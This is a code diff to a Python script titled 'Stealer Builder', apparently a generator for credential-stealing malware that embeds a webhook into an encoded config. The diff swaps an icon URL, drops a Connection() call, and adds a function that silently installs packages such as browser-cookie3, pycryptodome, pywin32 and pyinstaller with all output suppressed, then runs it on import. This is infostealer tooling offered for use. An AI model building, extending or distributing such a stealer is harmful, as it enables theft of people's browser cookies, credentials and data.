@@ -20,7 +20,6 @@ except Exception as e:
     MissingModule(e)
 
 Title("Stealer Builder")
-Connection()
 
 Scroll(GradientBanner(stealer_banner))
 
@@ -64,7 +63,7 @@ try:
         Continue()
         Reset()
 
-    icon_url       = 'https://i.imgur.com/EZ13VU9.png'
+    icon_url       = 'https://i.imgur.com/G8QR0f7.png'
     encoded_config = EncodeConfig(webhook, icon_url)
 
     selected = {}
@@ -155,6 +154,15 @@ try:
 #     or redistribute without prior written permission.
 # FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
 #     les crédits ou redistribuer sans autorisation écrite.
+
+import subprocess
+import sys
+
+def _0xInstallDependencies():
+    packages = ["requests", "psutil", "pywin32", "pycryptodome", "browser-cookie3", "opencv-python", "numpy", "pillow", "pyinstaller", "pefile"]
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade"] + packages,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,)
+
+_0xInstallDependencies()
 
 import os, sys, subprocess, socket, platform, zipfile, shutil, ctypes, stat
 import datetime, json, requests, base64, time, re, random, getpass, uuid
